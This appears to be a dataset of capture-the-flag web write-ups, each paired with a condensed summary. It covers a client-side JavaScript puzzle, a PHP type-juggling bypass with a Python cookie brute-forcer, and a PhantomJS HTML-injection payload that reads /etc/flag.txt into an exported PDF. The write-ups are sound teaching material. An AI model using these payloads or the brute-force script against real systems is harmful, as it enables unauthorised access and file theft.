    <p>How do you get inside?</p>
    <img src=""/static/img/ship.png"" alt=""crashed ship"" style=""width:60vw;"" />
    <form id=""door_form"">
      <input type=""radio"" name=""side"" value=""0"" />0
      <input type=""radio"" name=""side"" value=""1"" />1
      <input type=""radio"" name=""side"" value=""2"" />2
      <input type=""radio"" name=""side"" value=""3"" />3
      <input type=""radio"" name=""side"" value=""4"" />4
      <input type=""radio"" name=""side"" value=""5"" />5
      <input type=""radio"" name=""side"" value=""6"" />6
      <input type=""radio"" name=""side"" value=""7"" />7
      <input type=""radio"" name=""side"" value=""8"" />8
      <input type=""radio"" name=""side"" value=""9"" />9
      <input type=""radio"" name=""side"" value=""10"" />10
      <input type=""radio"" name=""side"" value=""11"" />11
      <input type=""radio"" name=""side"" value=""12"" />12
      <input type=""radio"" name=""side"" value=""13"" />13
      <input type=""radio"" name=""side"" value=""14"" />14
      <input type=""radio"" name=""side"" value=""15"" />15
      <input type=""radio"" name=""side"" value=""16"" />16
      <input type=""radio"" name=""side"" value=""17"" />17
      <input type=""radio"" name=""side"" value=""18"" />18
      <input type=""radio"" name=""side"" value=""19"" />19
      <input type=""radio"" name=""side"" value=""20"" />20
      <input type=""radio"" name=""side"" value=""21"" />21
      <input type=""radio"" name=""side"" value=""22"" />22
      <input type=""radio"" name=""side"" value=""23"" />23
      <input type=""radio"" name=""side"" value=""24"" />24
      <input type=""radio"" name=""side"" value=""25"" />25
      <input type=""radio"" name=""side"" value=""26"" />26
      <input type=""radio"" name=""side"" value=""27"" />27
      <input type=""radio"" name=""side"" value=""28"" />28
      <input type=""radio"" name=""side"" value=""29"" />29
      <input type=""radio"" name=""side"" value=""30"" />30
      <input type=""radio"" name=""side"" value=""31"" />31
      <input type=""radio"" name=""side"" value=""32"" />32
      <input type=""radio"" name=""side"" value=""33"" />33
      <input type=""radio"" name=""side"" value=""34"" />34
      <input type=""radio"" name=""side"" value=""35"" />35
      <input type=""radio"" name=""side"" value=""36"" />36
      <input type=""radio"" name=""side"" value=""37"" />37
      <input type=""radio"" name=""side"" value=""38"" />38
      <input type=""radio"" name=""side"" value=""39"" />39
      <input type=""radio"" name=""side"" value=""40"" />40
      <input type=""radio"" name=""side"" value=""41"" />41
      <input type=""radio"" name=""side"" value=""42"" />42
      <input type=""radio"" name=""side"" value=""43"" />43
      <input type=""radio"" name=""side"" value=""44"" />44
      <input type=""radio"" name=""side"" value=""45"" />45
      <input type=""radio"" name=""side"" value=""46"" />46
      <input type=""radio"" name=""side"" value=""47"" />47
      <input type=""radio"" name=""side"" value=""48"" />48
      <input type=""radio"" name=""side"" value=""49"" />49
      <input type=""radio"" name=""side"" value=""50"" />50
      <input type=""radio"" name=""side"" value=""51"" />51
      <input type=""radio"" name=""side"" value=""52"" />52
      <input type=""radio"" name=""side"" value=""53"" />53
      <input type=""radio"" name=""side"" value=""54"" />54
      <input type=""radio"" name=""side"" value=""55"" />55
      <input type=""radio"" name=""side"" value=""56"" />56
      <input type=""radio"" name=""side"" value=""57"" />57
      <input type=""radio"" name=""side"" value=""58"" />58
      <input type=""radio"" name=""side"" value=""59"" />59
      <input type=""radio"" name=""side"" value=""60"" />60
      <input type=""radio"" name=""side"" value=""61"" />61
      <input type=""radio"" name=""side"" value=""62"" />62
      <input type=""radio"" name=""side"" value=""63"" />63
      <input type=""radio"" name=""side"" value=""64"" />64
      <input type=""radio"" name=""side"" value=""65"" />65
      <input type=""radio"" name=""side"" value=""66"" />66
      <input type=""radio"" name=""side"" value=""67"" />67
      <input type=""radio"" name=""side"" value=""68"" />68
      <input type=""radio"" name=""side"" value=""69"" />69
      <input type=""radio"" name=""side"" value=""70"" />70
      <input type=""radio"" name=""side"" value=""71"" />71
      <input type=""radio"" name=""side"" value=""72"" />72
      <input type=""radio"" name=""side"" value=""73"" />73
      <input type=""radio"" name=""side"" value=""74"" />74
      <input type=""radio"" name=""side"" value=""75"" />75
      <input type=""radio"" name=""side"" value=""76"" />76
      <input type=""radio"" name=""side"" value=""77"" />77
      <input type=""radio"" name=""side"" value=""78"" />78
      <input type=""radio"" name=""side"" value=""79"" />79
      <input type=""radio"" name=""side"" value=""80"" />80
      <input type=""radio"" name=""side"" value=""81"" />81
      <input type=""radio"" name=""side"" value=""82"" />82
      <input type=""radio"" name=""side"" value=""83"" />83
      <input type=""radio"" name=""side"" value=""84"" />84
      <input type=""radio"" name=""side"" value=""85"" />85
      <input type=""radio"" name=""side"" value=""86"" />86
      <input type=""radio"" name=""side"" value=""87"" />87
      <input type=""radio"" name=""side"" value=""88"" />88
      <input type=""radio"" name=""side"" value=""89"" />89
      <input type=""radio"" name=""side"" value=""90"" />90
      <input type=""radio"" name=""side"" value=""91"" />91
      <input type=""radio"" name=""side"" value=""92"" />92
      <input type=""radio"" name=""side"" value=""93"" />93
      <input type=""radio"" name=""side"" value=""94"" />94
      <input type=""radio"" name=""side"" value=""95"" />95
      <input type=""radio"" name=""side"" value=""96"" />96
      <input type=""radio"" name=""side"" value=""97"" />97
      <input type=""radio"" name=""side"" value=""98"" />98
      <input type=""radio"" name=""side"" value=""99"" />99
      <input type=""radio"" name=""side"" value=""100"" />100
      <input type=""radio"" name=""side"" value=""101"" />101
      <input type=""radio"" name=""side"" value=""102"" />102
      <input type=""radio"" name=""side"" value=""103"" />103
      <input type=""radio"" name=""side"" value=""104"" />104
      <input type=""radio"" name=""side"" value=""105"" />105
      <input type=""radio"" name=""side"" value=""106"" />106
      <input type=""radio"" name=""side"" value=""107"" />107
      <input type=""radio"" name=""side"" value=""108"" />108
      <input type=""radio"" name=""side"" value=""109"" />109
      <input type=""radio"" name=""side"" value=""110"" />110
      <input type=""radio"" name=""side"" value=""111"" />111
      <input type=""radio"" name=""side"" value=""112"" />112
      <input type=""radio"" name=""side"" value=""113"" />113
      <input type=""radio"" name=""side"" value=""114"" />114
      <input type=""radio"" name=""side"" value=""115"" />115
      <input type=""radio"" name=""side"" value=""116"" />116
      <input type=""radio"" name=""side"" value=""117"" />117
      <input type=""radio"" name=""side"" value=""118"" />118
      <input type=""radio"" name=""side"" value=""119"" />119
      <input type=""radio"" name=""side"" value=""120"" />120
      <input type=""radio"" name=""side"" value=""121"" />121
      <input type=""radio"" name=""side"" value=""122"" />122
      <input type=""radio"" name=""side"" value=""123"" />123
      <input type=""radio"" name=""side"" value=""124"" />124
      <input type=""radio"" name=""side"" value=""125"" />125
      <input type=""radio"" name=""side"" value=""126"" />126
      <input type=""radio"" name=""side"" value=""127"" />127
      <input type=""radio"" name=""side"" value=""128"" />128
      <input type=""radio"" name=""side"" value=""129"" />129
      <input type=""radio"" name=""side"" value=""130"" />130
      <input type=""radio"" name=""side"" value=""131"" />131
      <input type=""radio"" name=""side"" value=""132"" />132
      <input type=""radio"" name=""side"" value=""133"" />133
      <input type=""radio"" name=""side"" value=""134"" />134
      <input type=""radio"" name=""side"" value=""135"" />135
      <input type=""radio"" name=""side"" value=""136"" />136
      <input type=""radio"" name=""side"" value=""137"" />137
      <input type=""radio"" name=""side"" value=""138"" />138
      <input type=""radio"" name=""side"" value=""139"" />139
      <input type=""radio"" name=""side"" value=""140"" />140
      <input type=""radio"" name=""side"" value=""141"" />141
      <input type=""radio"" name=""side"" value=""142"" />142
      <input type=""radio"" name=""side"" value=""143"" />143
      <input type=""radio"" name=""side"" value=""144"" />144
      <input type=""radio"" name=""side"" value=""145"" />145
      <input type=""radio"" name=""side"" value=""146"" />146
      <input type=""radio"" name=""side"" value=""147"" />147
      <input type=""radio"" name=""side"" value=""148"" />148
      <input type=""radio"" name=""side"" value=""149"" />149
      <input type=""radio"" name=""side"" value=""150"" />150
      <input type=""radio"" name=""side"" value=""151"" />151
      <input type=""radio"" name=""side"" value=""152"" />152
      <input type=""radio"" name=""side"" value=""153"" />153
      <input type=""radio"" name=""side"" value=""154"" />154
      <input type=""radio"" name=""side"" value=""155"" />155
      <input type=""radio"" name=""side"" value=""156"" />156
      <input type=""radio"" name=""side"" value=""157"" />157
      <input type=""radio"" name=""side"" value=""158"" />158
      <input type=""radio"" name=""side"" value=""159"" />159
      <input type=""radio"" name=""side"" value=""160"" />160
      <input type=""radio"" name=""side"" value=""161"" />161
      <input type=""radio"" name=""side"" value=""162"" />162
      <input type=""radio"" name=""side"" value=""163"" />163
      <input type=""radio"" name=""side"" value=""164"" />164
      <input type=""radio"" name=""side"" value=""165"" />165
      <input type=""radio"" name=""side"" value=""166"" />166
      <input type=""radio"" name=""side"" value=""167"" />167
      <input type=""radio"" name=""side"" value=""168"" />168
      <input type=""radio"" name=""side"" value=""169"" />169
      <input type=""radio"" name=""side"" value=""170"" />170
      <input type=""radio"" name=""side"" value=""171"" />171
      <input type=""radio"" name=""side"" value=""172"" />172
      <input type=""radio"" name=""side"" value=""173"" />173
      <input type=""radio"" name=""side"" value=""174"" />174
      <input type=""radio"" name=""side"" value=""175"" />175
      <input type=""radio"" name=""side"" value=""176"" />176
      <input type=""radio"" name=""side"" value=""177"" />177
      <input type=""radio"" name=""side"" value=""178"" />178
      <input type=""radio"" name=""side"" value=""179"" />179
      <input type=""radio"" name=""side"" value=""180"" />180
      <input type=""radio"" name=""side"" value=""181"" />181
      <input type=""radio"" name=""side"" value=""182"" />182
      <input type=""radio"" name=""side"" value=""183"" />183
      <input type=""radio"" name=""side"" value=""184"" />184
      <input type=""radio"" name=""side"" value=""185"" />185
      <input type=""radio"" name=""side"" value=""186"" />186
      <input type=""radio"" name=""side"" value=""187"" />187
      <input type=""radio"" name=""side"" value=""188"" />188
      <input type=""radio"" name=""side"" value=""189"" />189
      <input type=""radio"" name=""side"" value=""190"" />190
      <input type=""radio"" name=""side"" value=""191"" />191
      <input type=""radio"" name=""side"" value=""192"" />192
      <input type=""radio"" name=""side"" value=""193"" />193
      <input type=""radio"" name=""side"" value=""194"" />194
      <input type=""radio"" name=""side"" value=""195"" />195
      <input type=""radio"" name=""side"" value=""196"" />196
      <input type=""radio"" name=""side"" value=""197"" />197
      <input type=""radio"" name=""side"" value=""198"" />198
      <input type=""radio"" name=""side"" value=""199"" />199
      <input type=""radio"" name=""side"" value=""200"" />200
      <input type=""radio"" name=""side"" value=""201"" />201
      <input type=""radio"" name=""side"" value=""202"" />202
      <input type=""radio"" name=""side"" value=""203"" />203
      <input type=""radio"" name=""side"" value=""204"" />204
      <input type=""radio"" name=""side"" value=""205"" />205
      <input type=""radio"" name=""side"" value=""206"" />206
      <input type=""radio"" name=""side"" value=""207"" />207
      <input type=""radio"" name=""side"" value=""208"" />208
      <input type=""radio"" name=""side"" value=""209"" />209
      <input type=""radio"" name=""side"" value=""210"" />210
      <input type=""radio"" name=""side"" value=""211"" />211
      <input type=""radio"" name=""side"" value=""212"" />212
      <input type=""radio"" name=""side"" value=""213"" />213
      <input type=""radio"" name=""side"" value=""214"" />214
      <input type=""radio"" name=""side"" value=""215"" />215
      <input type=""radio"" name=""side"" value=""216"" />216
      <input type=""radio"" name=""side"" value=""217"" />217
      <input type=""radio"" name=""side"" value=""218"" />218
      <input type=""radio"" name=""side"" value=""219"" />219
      <input type=""radio"" name=""side"" value=""220"" />220
      <input type=""radio"" name=""side"" value=""221"" />221
      <input type=""radio"" name=""side"" value=""222"" />222
      <input type=""radio"" name=""side"" value=""223"" />223
      <input type=""radio"" name=""side"" value=""224"" />224
      <input type=""radio"" name=""side"" value=""225"" />225
      <input type=""radio"" name=""side"" value=""226"" />226
      <input type=""radio"" name=""side"" value=""227"" />227
      <input type=""radio"" name=""side"" value=""228"" />228
      <input type=""radio"" name=""side"" value=""229"" />229
      <input type=""radio"" name=""side"" value=""230"" />230
      <input type=""radio"" name=""side"" value=""231"" />231
      <input type=""radio"" name=""side"" value=""232"" />232
      <input type=""radio"" name=""side"" value=""233"" />233
      <input type=""radio"" name=""side"" value=""234"" />234
      <input type=""radio"" name=""side"" value=""235"" />235
      <input type=""radio"" name=""side"" value=""236"" />236
      <input type=""radio"" name=""side"" value=""237"" />237
      <input type=""radio"" name=""side"" value=""238"" />238
      <input type=""radio"" name=""side"" value=""239"" />239
      <input type=""radio"" name=""side"" value=""240"" />240
      <input type=""radio"" name=""side"" value=""241"" />241
      <input type=""radio"" name=""side"" value=""242"" />242
      <input type=""radio"" name=""side"" value=""243"" />243
      <input type=""radio"" name=""side"" value=""244"" />244
      <input type=""radio"" name=""side"" value=""245"" />245
      <input type=""radio"" name=""side"" value=""246"" />246
      <input type=""radio"" name=""side"" value=""247"" />247
      <input type=""radio"" name=""side"" value=""248"" />248
      <input type=""radio"" name=""side"" value=""249"" />249
      <input type=""radio"" name=""side"" value=""250"" />250
      <input type=""radio"" name=""side"" value=""251"" />251
      <input type=""radio"" name=""side"" value=""252"" />252
      <input type=""radio"" name=""side"" value=""253"" />253
      <input type=""radio"" name=""side"" value=""254"" />254
      <input type=""radio"" name=""side"" value=""255"" />255
      <input type=""radio"" name=""side"" value=""256"" />256
      <input type=""radio"" name=""side"" value=""257"" />257
      <input type=""radio"" name=""side"" value=""258"" />258
      <input type=""radio"" name=""side"" value=""259"" />259
      <input type=""radio"" name=""side"" value=""260"" />260
      <input type=""radio"" name=""side"" value=""261"" />261
      <input type=""radio"" name=""side"" value=""262"" />262
      <input type=""radio"" name=""side"" value=""263"" />263
      <input type=""radio"" name=""side"" value=""264"" />264
      <input type=""radio"" name=""side"" value=""265"" />265
      <input type=""radio"" name=""side"" value=""266"" />266
      <input type=""radio"" name=""side"" value=""267"" />267
      <input type=""radio"" name=""side"" value=""268"" />268
      <input type=""radio"" name=""side"" value=""269"" />269
      <input type=""radio"" name=""side"" value=""270"" />270
      <input type=""radio"" name=""side"" value=""271"" />271
      <input type=""radio"" name=""side"" value=""272"" />272
      <input type=""radio"" name=""side"" value=""273"" />273
      <input type=""radio"" name=""side"" value=""274"" />274
      <input type=""radio"" name=""side"" value=""275"" />275
      <input type=""radio"" name=""side"" value=""276"" />276
      <input type=""radio"" name=""side"" value=""277"" />277
      <input type=""radio"" name=""side"" value=""278"" />278
      <input type=""radio"" name=""side"" value=""279"" />279
      <input type=""radio"" name=""side"" value=""280"" />280
      <input type=""radio"" name=""side"" value=""281"" />281
      <input type=""radio"" name=""side"" value=""282"" />282
      <input type=""radio"" name=""side"" value=""283"" />283
      <input type=""radio"" name=""side"" value=""284"" />284
      <input type=""radio"" name=""side"" value=""285"" />285
      <input type=""radio"" name=""side"" value=""286"" />286
      <input type=""radio"" name=""side"" value=""287"" />287
      <input type=""radio"" name=""side"" value=""288"" />288
      <input type=""radio"" name=""side"" value=""289"" />289
      <input type=""radio"" name=""side"" value=""290"" />290
      <input type=""radio"" name=""side"" value=""291"" />291
      <input type=""radio"" name=""side"" value=""292"" />292
      <input type=""radio"" name=""side"" value=""293"" />293
      <input type=""radio"" name=""side"" value=""294"" />294
      <input type=""radio"" name=""side"" value=""295"" />295
      <input type=""radio"" name=""side"" value=""296"" />296
      <input type=""radio"" name=""side"" value=""297"" />297
      <input type=""radio"" name=""side"" value=""298"" />298
      <input type=""radio"" name=""side"" value=""299"" />299
      <input type=""radio"" name=""side"" value=""300"" />300
      <input type=""radio"" name=""side"" value=""301"" />301
      <input type=""radio"" name=""side"" value=""302"" />302
      <input type=""radio"" name=""side"" value=""303"" />303
      <input type=""radio"" name=""side"" value=""304"" />304
      <input type=""radio"" name=""side"" value=""305"" />305
      <input type=""radio"" name=""side"" value=""306"" />306
      <input type=""radio"" name=""side"" value=""307"" />307
      <input type=""radio"" name=""side"" value=""308"" />308
      <input type=""radio"" name=""side"" value=""309"" />309
      <input type=""radio"" name=""side"" value=""310"" />310
      <input type=""radio"" name=""side"" value=""311"" />311
      <input type=""radio"" name=""side"" value=""312"" />312
      <input type=""radio"" name=""side"" value=""313"" />313
      <input type=""radio"" name=""side"" value=""314"" />314
      <input type=""radio"" name=""side"" value=""315"" />315
      <input type=""radio"" name=""side"" value=""316"" />316
      <input type=""radio"" name=""side"" value=""317"" />317
      <input type=""radio"" name=""side"" value=""318"" />318
      <input type=""radio"" name=""side"" value=""319"" />319
      <input type=""radio"" name=""side"" value=""320"" />320
      <input type=""radio"" name=""side"" value=""321"" />321
      <input type=""radio"" name=""side"" value=""322"" />322
      <input type=""radio"" name=""side"" value=""323"" />323
      <input type=""radio"" name=""side"" value=""324"" />324
      <input type=""radio"" name=""side"" value=""325"" />325
      <input type=""radio"" name=""side"" value=""326"" />326
      <input type=""radio"" name=""side"" value=""327"" />327
      <input type=""radio"" name=""side"" value=""328"" />328
      <input type=""radio"" name=""side"" value=""329"" />329
      <input type=""radio"" name=""side"" value=""330"" />330
      <input type=""radio"" name=""side"" value=""331"" />331
      <input type=""radio"" name=""side"" value=""332"" />332
      <input type=""radio"" name=""side"" value=""333"" />333
      <input type=""radio"" name=""side"" value=""334"" />334
      <input type=""radio"" name=""side"" value=""335"" />335
      <input type=""radio"" name=""side"" value=""336"" />336
      <input type=""radio"" name=""side"" value=""337"" />337
      <input type=""radio"" name=""side"" value=""338"" />338
      <input type=""radio"" name=""side"" value=""339"" />339
      <input type=""radio"" name=""side"" value=""340"" />340
      <input type=""radio"" name=""side"" value=""341"" />341
      <input type=""radio"" name=""side"" value=""342"" />342
      <input type=""radio"" name=""side"" value=""343"" />343
      <input type=""radio"" name=""side"" value=""344"" />344
      <input type=""radio"" name=""side"" value=""345"" />345
      <input type=""radio"" name=""side"" value=""346"" />346
      <input type=""radio"" name=""side"" value=""347"" />347
      <input type=""radio"" name=""side"" value=""348"" />348
      <input type=""radio"" name=""side"" value=""349"" />349
      <input type=""radio"" name=""side"" value=""350"" />350
      <input type=""radio"" name=""side"" value=""351"" />351
      <input type=""radio"" name=""side"" value=""352"" />352
      <input type=""radio"" name=""side"" value=""353"" />353
      <input type=""radio"" name=""side"" value=""354"" />354
      <input type=""radio"" name=""side"" value=""355"" />355
      <input type=""radio"" name=""side"" value=""356"" />356
      <input type=""radio"" name=""side"" value=""357"" />357
      <input type=""radio"" name=""side"" value=""358"" />358
      <input type=""radio"" name=""side"" value=""359"" />359
    </form>
    <button onClick=""check_door()"">Check</button>
  </body>
</html>
```

So you can discover the `http://web.ctf.b01lers.com:1000/static/js/door.js` file.

```javascript
function check_door() {
  var all_radio = document.getElementById(""door_form"").elements;
  var guess = null;

  for (var i = 0; i < all_radio.length; i++)
    if (all_radio[i].checked) guess = all_radio[i].value;

  rand = Math.floor(Math.random() * 360);
  if (rand == guess) window.location = ""/open/"";
  else window.location = ""/die/"";
}
```

So you can discover the `http://web.ctf.b01lers.com:1000/open/` endpoint.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
    <script src=""/static/js/open_sesame.js""></script>
  </head>
  <body>
    <h1>YOU FOUND THE DOOR!</h1>
    <p>How do you open it?</p>
    <img src=""/static/img/door.jpg"" alt=""door"" style=""width:60vw;"" />
    <script>
      open(0);
    </script>
  </body>
</html>
```

So you can discover the `http://web.ctf.b01lers.com:1000/static/js/open_sesame.js` file.

```javascript
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function open(i) {
  sleep(1).then(() => {
    open(i + 1);
  });
  if (i == 4000000000) window.location = ""/fight/"";
}
```

So you can discover the `http://web.ctf.b01lers.com:1000/fight/` endpoint.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
    <script src=""/static/js/fight.js""></script>
  </head>
  <body>
    <h1>AN ALIEN!</h1>
    <p>What do you do?</p>
    <img
      src=""/static/img/alien.png""
      alt=""door""
      style=""width:60vw;""
    />
    </br>
    <input type=""text"" id=""action"">
    <button onClick=""check_action()"">Fight!</button>
  </body>
</html>
```

So you can discover the `http://web.ctf.b01lers.com:1000/static/js/fight.js` file.

```javascript
// Run to scramble original flag
//console.log(scramble(flag, action));
function scramble(flag, key) {
  for (var i = 0; i < key.length; i++) {
    let n = key.charCodeAt(i) % flag.length;
    let temp = flag[i];
    flag[i] = flag[n];
    flag[n] = temp;
  }
  return flag;
}

function check_action() {
  var action = document.getElementById(""action"").value;
  var flag = [""{hey"", ""_boy"", ""aaaa"", ""s_im"", ""ck!}"", ""_baa"", ""aaaa"", ""pctf""];

  // TODO: unscramble function
}
```

So the flag is the following.

```
pctf{hey_boys_im_baaaaaaaaaack!}
```","The webpage contains the following HTML.

So you can discover the chase endpoint.

So you can discover the leftt endpoint.

So you can discover the shoot endpoint.

So you can discover the door endpoint.

So you can discover the door.js file.

So you can discover the open endpoint.

So you can discover the open_sesame.js file.

So you can discover the fight endpoint.

So you can discover the fight.js file.

So get the flag."
"# CONFidence CTF Teaser 2019 – My admin panel

* **Category:** web, warmup
* **Points:** 51

## Challenge

> I think I've found something interesting, but I'm not really a PHP expert. Do you think it's exploitable?
>
> https://gameserver.zajebistyc.tf/admin/

## Solution

The website has directory listing active, connecting to it two files are listed:
* `login.php`
* `login.php.bak`

The first page prints the message: `Not authenticated.`.

The [second file](login.php.bak) contains the PHP source code.

```php
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit(""Not authenticated.\n"");
}

if (!preg_match('/^{""hash"": [0-9A-Z\""]+}$/', $_COOKIE['otadmin'])) {
    echo ""COOKIE TAMPERING xD IM A SECURITY EXPERT\n"";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo ""COOKIE TAMPERING xD IM A SECURITY EXPERT\n""; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo(""I CAN EVEN GIVE YOU A HINT XD \n"");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit(""\n"");
}

display_admin();
```

Analyzing it, you can discover that a cookie named `otadmin` must be passed and its format must follow the following regex: `/^{""hash"": [0-9A-Z\""]+}$/`.

A correct value for that cookie can be the following: `{""hash"": ""T35T""}`.

If the passed value for that cookie is different from the MD5 hash of the `$cfg_pass` variable, a hint is given. You can use the correct value crafted befor to print it.

```
I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
```

The hint is obtained by the following snippet.

```php
    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }
```

Where `strlen(MD5('xDdddddd'))` is equals to 32 (i.e. the length of MD5 hashes is 32).

In that snippet, an AND operation is performed between the ASCII value of each char and the constant `0xC0` (i.e. `11000000`). Considering that the first three chars of the hint are 0, it means that the first original chars of the hash were numbers. That is due to the fact in the ASCII representation of numbers, the first most significant bits are `00` and the AND operation for that bits is performed with `11`.

So, the problem could be located in a *type juggling* in this comparison:

```php
$session_data['hash'] != strtoupper(MD5($cfg_pass))
```

To exploit it, you have to guess the numbers at the beginning of the MD5 string.

A [Python script](my-admin-panel.py) can be written to exploit this task.

```python
import time
import random
import os
import urllib2

target_url = ""https://gameserver.zajebistyc.tf/admin/login.php""
cookie_name = ""otadmin""
cookie_value = ""{{\""hash\"": {}}}""

# Check cookie method.
def check_cookie(value_to_check):
   
   # Trying cookie.
   cookie = ""{}={}"".format(cookie_name, cookie_value.format(value_to_check))
   print ""[*] Trying cookie {}"".format(cookie)      
   req = urllib2.Request(target_url)
   req.add_header(""Cookie"", cookie)
   req.add_header(""User-Agent"", ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);"")
   page = urllib2.urlopen(req)
   content = page.read()
      
   # Flag found.
   if ""p4{"" in content:
      print content
      return True
   else:
      return False

# Main method.
for i in range(1, 1000):

   try:
      
      if check_cookie(i):
         break
   
   except urllib2.HTTPError as err:
      print ""[*] Response > {}"".format(err.code)
      break

```

With the cookie `otadmin={""hash"": 389}` you will discover the flag.

```
p4{wtf_php_comparisons_how_do_they_work}
```","The website has directory listing active, connecting to it two files are listed:
`login.php`
`login.php.bak`

The first page prints the message: `Not authenticated.`.

The login.php.bak contains the PHP source code.

Analyzing it, you can discover that a cookie named `otadmin` must be passed and its format must follow the following regex.

A correct value for that cookie can be the following;

If the passed value for that cookie is different from the MD5 hash of the `$cfg_pass` variable, a hint is given. You can use the correct value crafted befor to print it.

The hint is obtained by the following snippet.

Where strlen function gives 32 (i.e. the length of MD5 hashes is 32).

In that snippet, an AND operation is performed between the ASCII value of each char and the constant `0xC0` (i.e. `11000000`). Considering that the first three chars of the hint are 0, it means that the first original chars of the hash were numbers. That is due to the fact in the ASCII representation of numbers, the first most significant bits are `00` and the AND operation for that bits is performed with `11`.

So, the problem could be located in a *type juggling* in this comparison.

To exploit it, you have to guess the numbers at the beginning of the MD5 string.

A Python script can be written to exploit this task.

[Python code implementing a brute force attack against a login page. The code tries different cookie values by sending HTTP requests to the target URL until it finds the correct one that contains a flag.]

With the cookie you will discover the flag.
"
"# DarkCON CTF 2021 – Capture the Meme

* **Category:** web
* **Points:** ?

## Challenge

> Made this meme generator for ya :) hope you like some memes 
> 
> Note: Flag at /etc/flag.txt
> 
> http://capture-the-meme.darkarmy.xyz/

## Solution

![index.png](index.png)

The web application allows you to create a meme specifying the URL of an image, the top text and the bottom text. The image can be exported in PDF format clicking on the ""Export!"" button.

Clicking on the button, the following request is created.

```
POST /export HTTP/1.1
Host: capture-the-meme.darkarmy.xyz
Content-Length: 93
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://capture-the-meme.darkarmy.xyz
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://capture-the-meme.darkarmy.xyz/
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=df45261952c636f9cab5329dc89f8aab11613847303
Connection: close

url=https%3A%2F%2Fimgflip.com%2Fs%2Fmeme%2FLaughing-Leo.png&upper=top+test&bottom=bottom+test
```

Creating a listener, you can discover that two requests are performed to retrieve the image.

```
user@machine:~$ sudo nc -lkp 1337
HEAD /foo.jpg HTTP/1.1
host: x.x.x.x:1337
content-length: 0
Connection: close

GET /foo.jpg HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: x.x.x.x:1337
```

*PhantomJS/2.1.1* is vulnerable to *CVE-2019-17221* and it is a deprecated package:
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17221](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17221);
* [https://github.com/h4ckologic/CVE-2019-17221/blob/master/PhantonJS_Arbitrary_File_Read.pdf](https://github.com/h4ckologic/CVE-2019-17221/blob/master/PhantonJS_Arbitrary_File_Read.pdf);
* [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/).

After some analysis, you can discover that top and bottom texts parse the HTML, interpreting it.

So it is sufficient to craft a payload like the following for one of the two texts.

```html
<script>x = new XMLHttpRequest; x.onload = function() { document.write(this.responseText) }; x.open(""GET"", ""file:///etc/flag.txt""); x.send();</script>
```

Putting the payload in a request like the following.

```
POST /export HTTP/1.1
Host: capture-the-meme.darkarmy.xyz
Content-Length: 292
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://capture-the-meme.darkarmy.xyz
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://capture-the-meme.darkarmy.xyz/
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=df45261952c636f9cab5329dc89f8aab11613847303
Connection: close

url=https%3A%2F%2Fimgflip.com%2Fs%2Fmeme%2FLaughing-Leo.png&upper=%3Cscript%3Ex+%3D+new+XMLHttpRequest%3B+x.onload+%3D+function%28%29+%7B+document.write%28this.responseText%29+%7D%3B+x.open%28%22GET%22%2C+%22file%3A%2F%2F%2Fetc%2Fflag.txt%22%29%3B+x.send%28%29%3B%3C%2Fscript%3E&bottom=bottom
```

A [PDF with the flag](export.pdf) will be returned.

```
darkCON{wh4t_1f_1_t01d_u_h4v3_r1ght_f14g_0f_th1s_ch411}
```","The web application allows you to create a meme specifying the URL of an image, the top text and the bottom text. The image can be exported in PDF format clicking on the ""Export!"" button.

Clicking on the button, a POST request is created.

Creating a listener, you can discover that two requests are performed to retrieve the image.

PhantomJS/2.1.1* is vulnerable to *CVE-2019-17221* and it is a deprecated package.

After some analysis, you can discover that top and bottom texts parse the HTML, interpreting it.

So it is sufficient to craft a payload like the following for one of the two texts.

[HTML script that performs an XMLHttpRequest to fetch the contents of the file ""/etc/flag.txt"" and writes it to the document. This could be an example of a cross-site scripting (XSS) attack or an attempt to access sensitive information.]

Putting the payload in a POST request.

A pdf with the flag will be returned."
"# DarkCON CTF 2021 – DarkCON Challs

* **Category:** web
* **Points:** ?

## Challenge

> A place where you can see all the challs of darkCON CTF using api but not the flag or can you @_@ ?
> 
> PS :- Try to get the flag of this chall xD
> 
> http://darkcon-challs.darkarmy.xyz/login

## Solution

The website contains a login form with two different authentications, user credentials and guest account, managed by a [JavaScript](auth.js).

